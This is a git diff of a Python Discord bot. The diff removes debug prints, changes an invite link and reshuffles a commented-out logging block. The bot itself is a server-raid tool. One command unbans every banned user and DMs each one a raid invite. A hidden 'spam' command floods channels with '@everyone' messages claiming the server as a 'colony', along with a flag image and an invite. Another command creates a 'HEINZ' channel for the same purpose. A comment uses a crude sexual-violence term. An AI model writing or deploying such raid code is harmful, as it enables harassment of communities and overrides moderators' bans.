@@ -77,7 +77,6 @@ class Bot(cmd.Bot):
                     await ctx.send(file=discord.File(data, os.path.basename(meme)))  # send the meme
         else:
             await ctx.send("`unable to locate a meme`")
-            print(memes)
 
 
     @cmd.command()
@@ -114,13 +113,9 @@ class Bot(cmd.Bot):
         # --DM Banned users
         bannedUsers = await ctx.guild.bans()
         unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-        print(bannedUsers)
         for ban in bannedUsers:
             user = ban.user
             await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-            print(user)
-            print(ban)
-            print(user)
             await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
             await user.send(unban.url)
 
@@ -130,7 +125,6 @@ class Bot(cmd.Bot):
     @cmd.command(aliases=["spam", "echo"], hidden=True)
     async def propaganda(ctx, *args):
         # --Spam server with propaganda--
-        print(args)
         args = [arg for arg in args]
         if len(args) == 1:
             try: # input validation for number of messages to send
@@ -141,7 +135,7 @@ class Bot(cmd.Bot):
                         await ctx.send(
                             "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
                         await ctx.send(file=discord.File('assets/flag.jpg'))
-                        await ctx.send("Join us: https://discord.gg/JPT9536")
+                        await ctx.send("Join us: https://discord.gg/Dbp3yUj")
             except ValueError:
                 await ctx.send("Please enter an integer for the number of messages")
 
@@ -191,14 +185,15 @@ class Bot(cmd.Bot):
         heinz = await ctx.guild.create_text_channel('HEINZ')
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
+        ''' doesn't work well so it's commented out for now
         # -log the rape-
-        #for guild in ctx.bot.guilds:
-        #    if guild.name == "beenzbot-Log":
-        #        logserver = guild
+        for guild in ctx.bot.guilds:
+            if guild.name == "beenzbot-Log":
+                logserver = guild
         
-        #if originalname == None:
-        #    originalname = heinz.guild.name
-            
+        if originalname == None:
+            originalname = heinz.guild.name
+        '''
 
         unban = await heinz.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
         #await logserver.channels[0].send("@everyone new raid: " + originalname)
